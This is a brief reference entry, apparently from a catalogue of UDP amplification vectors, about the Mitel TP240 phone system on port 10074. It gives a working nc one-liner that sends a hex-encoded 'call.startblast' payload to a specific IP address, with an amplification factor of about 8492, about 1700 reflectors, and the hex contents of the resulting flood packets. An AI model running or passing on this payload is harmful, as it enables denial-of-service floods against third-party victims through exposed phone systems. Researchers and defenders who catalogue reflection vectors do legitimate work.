# TP240 Mitel Phone System

## Port: **10074**

## Proto: **UDP**

## Data Amplification factor: **~8492 using 'call.startblast 2000 3'**

## Reflector count: ~1700

    
     echo -ne '\x63\x61\x6c\x6c\x2e\x73\x74\x61\x72\x74\x62\x6c\x61\x73\x74\x20\x32\x30\x30\x30\x20\x33\x00'| nc -u 31.121.28.76 10074
    
Startblast command requesting 2000 callbacks causes 4k packets yielding 552000 bytes received from a 23 byte payload.

- Start packet `3c74703234306476723e0a` aka `<tp240dvr>`

Packets come in sets of 2 after the initial packet notifying the start of the test

- Flood packet #1 `5374617274696e672043616c6c2c2043616c6c5f49443d207465737463616c6c5f302020` aka `Starting Call, Call_ID= testcall_0  `
- Flood packet #2 `2e2e2e6469616c696e6720330a` aka `...dialing 3`

Finally 4000 packets later
- End packet `3c2f74703234306476723e0a` aka `</tp240dvr>`

Be aware "Flood packet #1" is dynamic as the Call_ID field increments with each packet
